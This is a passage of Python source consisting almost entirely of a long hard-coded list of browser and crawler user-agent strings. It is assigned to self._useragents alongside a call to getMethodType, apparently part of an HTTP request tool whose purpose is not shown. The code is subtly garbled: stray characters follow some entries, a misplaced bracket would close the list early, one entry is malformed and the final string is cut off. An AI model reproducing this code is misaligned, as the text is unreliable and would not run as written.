                 'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
                 'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                 'Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0',
                 'Mozilla/2.02E (Win95; U)',
                 'Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)',
                 'Mozilla/5.0 (Linux; U; Android 0.5; en-us)',
                 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
                 'Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30',
                 'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 Safari/538.1',
                 'Privoxy/1.0',

                 'CERN-LineMode/2.15',

                 'cg-eye interactive',

                 'China Local Browser 2.6',

                 'ClariaBot/1.0',

                 'Comos/0.9_(robot@xyleme.com)',

                 'Crawler@alexa.com',

                 'DonutP; Windows98SE',

                 'Dr.Web (R) online scanner: http://online.drweb.com/',

                 'Dragonfly File Reader',

                 'Eurobot/1.0 (http://www.ayell.eu)',

                 'FARK.com link verifier',
            'FavIconizer',
            'Feliz - Mixcat Crawler (+http://mixcat.com)',
            'TwitterBot (http://www.twitter.com)',
            'DataCha0s/2.0',
            'EvaalSE - bot@evaal.com',
            'Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)',
            'rchive.org_bot',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
            'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1',
            'Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',
            'Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1',
            'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3',
            'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254',
            'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536',
            'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058',
            'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.3',6
            'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
            'Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US',
            'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
            'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+',
            'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)',
            'Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2',
            'Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)',
            'Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPod touch; CPU iPhone 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 EdgA/46.3.4.5155',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 EdgA/46.3.4.5155',
            'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 EdgA/46.3.4.5155',
            'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 EdgA/46.3.4.5155',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 YaBrowser/21.6.0 Yowser/2.5 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 YaBrowser/21.5.6.744 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 YaBrowser/21.5.6.744 Mobile/15E148 Safari/605.1',
            'Mozilla/5.0 (iPod touch; CPU iPhone 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 YaBrowser/21.5.6.744 Mobile/15E148 Safari/605.1',
            'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16.2',
            'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
            'Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16',
            'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
            'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52',
            'Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50',
            'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
            'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11',
            'Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11',
            'Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10',
            'Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01',
            'Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01',
            'Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01',
            'Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00',
            'Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00',
            'Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00',
            'Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62',
            'Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62',
            'Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61',
            'Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61',
            'Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61',
            'Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60',
            'Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54',
            'Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53',
            'Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51',
            'Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51',
            'Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51',
            'Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5',
            'Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10',
            'Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10',
            'Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01',
            'Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00',
            'Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00',
            'Opera/9.99 (X11; U; sk)',
            'Opera/9.70 (Linux ppc64 ; U; en) Presto/2.2.1',
            'Opera/9.70 (Linux i686 ; U; zh-cn) Presto/2.2.0',
            'Opera/9.70 (Linux i686 ; U; en-us) Presto/2.2.0',
            'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1',
            'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.0',
            'Opera/9.70 (Linux i686 ; U; ; en) Presto/2.2.1',
            'Opera/9.70 (Linux i686 ; U;  ; en) Presto/2.2.1',
            'Mozilla/5.0 (Linux i686 ; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.70',
            'Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70',
            'Opera/9.64 (X11; Linux x86_64; U; pl) Presto/2.1.1',
            'Opera/9.64 (X11; Linux x86_64; U; hr) Presto/2.1.1',
            'Opera/9.64 (X11; Linux x86_64; U; en-GB) Presto/2.1.1',
            'Opera/9.64 (X11; Linux x86_64; U; en) Presto/2.1.1',
            'Opera/9.64 (X11; Linux x86_64; U; de) Presto/2.1.1',
            'Opera/9.64 (X11; Linux x86_64; U; cs) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; tr) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; sv) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; pl) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; nb) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; Linux Mint; it) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; en) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; de) Presto/2.1.1',
            'Opera/9.64 (X11; Linux i686; U; da) Presto/2.1.1',
            'Opera/9.63 (X11; Linux x86_64; U; ru) Presto/2.1.1',
            'Opera/9.63 (X11; Linux x86_64; U; cs) Presto/2.1.1',
            'Opera/9.63 (X11; Linux i686; U; ru) Presto/2.1.1',
            'Opera/9.63 (X11; Linux i686; U; ru)',
            'Opera/9.63 (X11; Linux i686; U; nb) Presto/2.1.1',            
            'Opera/9.63 (X11; Linux i686; U; en)',
            'Opera/9.63 (X11; Linux i686; U; de) Presto/2.1.1',
            'Opera/9.63 (X11; Linux i686)',
            'Opera/9.63 (X11; FreeBSD 7.1-RELEASE i386; U; en) Presto/2.1.1',
            'Opera/9.62 (X11; Linux x86_64; U; ru) Presto/2.1.1',
            'Opera/9.62 (X11; Linux x86_64; U; en_GB, en_US) Presto/2.1.1',
            'Opera/9.62 (X11; Linux i686; U; pt-BR) Presto/2.1.1',
            'Opera/9.62 (X11; Linux i686; U; Linux Mint; en) Presto/2.1.1',
            'Opera/9.62 (X11; Linux i686; U; it) Presto/2.1.1',
            'Opera/9.62 (X11; Linux i686; U; fi) Presto/2.1.1',
            'Opera/9.62 (X11; Linux i686; U; en) Presto/2.1.1',
            'Opera/9.61 (X11; Linux x86_64; U; fr) Presto/2.1.1',
            'Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1',
            'Opera/9.61 (X11; Linux i686; U; pl) Presto/2.1.1',
            'Opera/9.61 (X11; Linux i686; U; en) Presto/2.1.1',
            'Opera/9.61 (X11; Linux i686; U; de) Presto/2.1.1',
            'Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1',
            'Opera/9.60 (X11; Linux x86_64; U)',
            'Opera/9.60 (X11; Linux i686; U; ru) Presto/2.1.1',
            'Opera/9.60 (X11; Linux i686; U; en-GB) Presto/2.1.1',
            'Mozilla/5.0 (X11; Linux x86_64; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.60',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60',
            'Opera/9.52 (X11; Linux x86_64; U; ru)',
            'Opera/9.52 (X11; Linux x86_64; U; en)',
            'Opera/9.52 (X11; Linux x86_64; U)',
            'Opera/9.52 (X11; Linux ppc; U; de)',
            'Opera/9.52 (X11; Linux i686; U; fr)',
            'Opera/9.52 (X11; Linux i686; U; en)',
            'Opera/9.52 (X11; Linux i686; U; cs)',
            'Opera/9.52 (Macintosh; PPC Mac OS X; U; ja)',
            'Opera/9.52 (Macintosh; PPC Mac OS X; U; fr)',
            'Opera/9.52 (Macintosh; Intel Mac OS X; U; pt-BR)',
            'Opera/9.52 (Macintosh; Intel Mac OS X; U; pt)',
            'Opera/9.51 (X11; Linux i686; U; Linux Mint; en)',
            'Opera/9.51 (X11; Linux i686; U; fr)',
            'Opera/9.51 (X11; Linux i686; U; de)',
            'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)',
            'Mozilla/50(X11; Linux i686; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51',
            'Opera/9.50 (X11; Linux x86_64; U; pl)',
            'Opera/9.50 (X11; Linux x86_64; U; nb)',
            'Opera/9.50 (X11; Linux ppc; U; en)',
            'Opera/9.50 (X11; Linux i686; U; es-ES)',
            'Opera/9.50 (Macintosh; Intel Mac OS X; U; en)',
            'Opera/9.50 (Macintosh; Intel Mac OS X; U; de)',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50',
            'Opera/9.30 (Nintendo Wii; U; ; 2071; Wii Shop Channel/1.0; en)',
            'Opera/9.30 (Nintendo Wii; U; ; 2047-7;pt-br)',
            'Opera/9.30 (Nintendo Wii; U; ; 2047-7;es)',
            'Opera/9.30 (Nintendo Wii; U; ; 2047-7;en)',
            'Opera/9.30 (Nintendo Wii; U; ; 2047-7; fr)',
            'Opera/9.30 (Nintendo Wii; U; ; 2047-7; de)',
            'Opera/9.27 (X11; Linux i686; U; fr)',
            'Opera/9.27 (X11; Linux i686; U; en)',
            'Opera/9.27 (Macintosh; Intel Mac OS X; U; sv)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27',
            'Opera/9.26 (Windows; U; pl)',
            'Opera/9.26 (Macintosh; PPC Mac OS X; U; en)',
            'Opera/9.25 (X11; Linux i686; U; fr-ca)',
            'Opera/9.25 (X11; Linux i686; U; fr)',
            'Opera/9.25 (X11; Linux i686; U; en)',
            'Opera/9.25 (OpenSolaris; U; en)',
            'Opera/9.25 (Macintosh; PPC Mac OS X; U; en)',
            'Opera/9.25 (Macintosh; Intel Mac OS X; U; en)',
            'Opera/9.24 (X11; SunOS i86pc; U; en)',
            'Opera/9.24 (X11; Linux i686; U; de)',
            'Opera/9.24 (Macintosh; PPC Mac OS X; U; en)',
            'Mozilla/4.3 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24',
            'Opera/9.23 (X11; Linux x86_64; U; en)',
            'Opera/9.23 (X11; Linux i686; U; es-es)',
            'Opera/9.23 (X11; Linux i686; U; en)',
            'Opera/9.23 (Nintendo Wii; U; ; 1038-58; Wii Internet Channel/1.0; en)',
            'Opera/9.23 (Macintosh; Intel Mac OS X; U; ja)',
            'Opera/9.23 (Mac OS X; ru)',
            'Opera/9.23 (Mac OS X; fr)',
            'Mozilla/5.0 (X11; Linux i686; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.23',
            'Opera/9.22 (X11; OpenBSD i386; U; en)',
            'Opera/9.22 (X11; Linux i686; U; en)',
            'Opera/9.22 (X11; Linux i686; U; de)',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22',
            'Opera/9.21 (X11; Linux x86_64; U; en)',
            'Opera/9.21 (X11; Linux i686; U; es-es)',
            'Opera/9.21 (X11; Linux i686; U; en)',
            'Opera/9.21 (X11; Linux i686; U; de)',
            'Opera/9.21 (Macintosh; PPC Mac OS X; U; en)',
            'Opera/9.21 (Macintosh; Intel Mac OS X; U; en)',
            'Opera/9.20 (X11; Linux x86_64; U; en)',
            'Opera/9.20 (X11; Linux ppc; U; en)',
            'Opera/9.20 (X11; Linux i686; U; tr)',
            'Opera/9.20 (X11; Linux i686; U; ru)',
            'Opera/9.20 (X11; Linux i686; U; pl)',
            'Opera/9.20 (X11; Linux i686; U; es-es)',
            'Opera/9.20 (X11; Linux i686; U; en)',
            'Opera/9.20 (X11; Linux i586; U; en)',
            'Opera/9.12 (X11; Linux i686; U; en) (Ubuntu)',
            'Opera/9.10 (X11; Linux; U; en)',
            'Opera/9.10 (X11; Linux x86_64; U; en)',
            'Opera/9.10 (X11; Linux i686; U; pl)',77
            'Opera/9.10 (X11; Linux i686; U; ubuntu;pl)',
            'Opera/9.10 (X11; Linux i686; U; en)',
            'Opera/9.10 (X11; Linux i386; U; en)',
            'Opera/9.02 (X11; Linux i686; U; pl)',
            'Opera/9.02 (X11; Linux i686; U; hu)',
            'Opera/9.02 (X11; Linux i686; U; en)',
            'Opera/9.02 (X11; Linux i686; U; de)',
            'Opera/9.02 (Windows; U; nl)',
            'Opera/9.02 (Windows XP; U; ru)',
            'Opera/9.01 (X11; Linux i686; U; en)',
            'Opera/9.01 (X11; FreeBSD 6 i386; U;pl)',
            'Opera/9.01 (X11; FreeBSD 6 i386; U; en)',
            'Opera/9.01 (Macintosh; PPC Mac OS X; U; it)',
            'Opera/9.01 (Macintosh; PPC Mac OS X; U; en)',
            'Opera/9.00 (X11; Linux i686; U; pl)',
            'Opera/9.00 (X11; Linux i686; U; en)',
            'Opera/9.00 (X11; Linux i686; U; de)',
            'Opera/9.00 (Windows; U)',
            'Opera/9.00 (Nintendo Wii; U; ; 1038-58; Wii Internet Channel/1.0; en)',
            'Opera/9.00 (Macintosh; PPC Mac OS X; U; es)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; Sprint:PPC-6700) Opera 8.65 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320)Opera 8.65 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320) Opera 8.65 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [zh-cn',]
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [nl]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [de]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.65 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC) Opera 8.65 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.60 [en]',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.60 [en]',
            'Opera/8.54 (X11; Linux i686; U; pl)',
            'Opera/8.54 (X11; Linux i686; U; de)',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54',
            'Opera/8.52 (X11; Linux x86_64; U; en)',
            'Opera/8.52 (X11; Linux i686; U; en)',
            'Mozilla/5.0 (X11; Linux i686; U; en) Opera 8.52',
            'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.52',
            'Opera/8.51 (X11; U; Linux i686; en-US; rv:1.8)',
            'Opera/8.51 (X11; Linux x86_64; U; en)',
            'Opera/8.51 (X11; Linux i686; U; en)',
            'Opera/8.51 (Macintosh; PPC Mac OS X; U; de)',
            'Opera/8.51 (FreeBSD 5.1; U; en)',
            'Mozilla/5.0 (Macintosh; PP'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
